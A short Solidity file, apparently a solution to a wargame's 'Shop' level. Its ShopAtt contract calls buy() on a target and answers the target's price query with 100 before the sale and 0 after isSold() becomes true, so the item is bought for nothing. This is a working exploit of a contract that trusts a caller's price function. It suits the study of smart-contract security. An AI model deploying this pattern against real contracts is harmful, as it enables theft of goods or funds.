// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Shop.sol";

contract ShopAtt {
    function attack(address target) public {
        Shop(target).buy();
    }

    function price() external view returns (uint256) {
        return Shop(msg.sender).isSold() ? 0 : 100;
    }
}
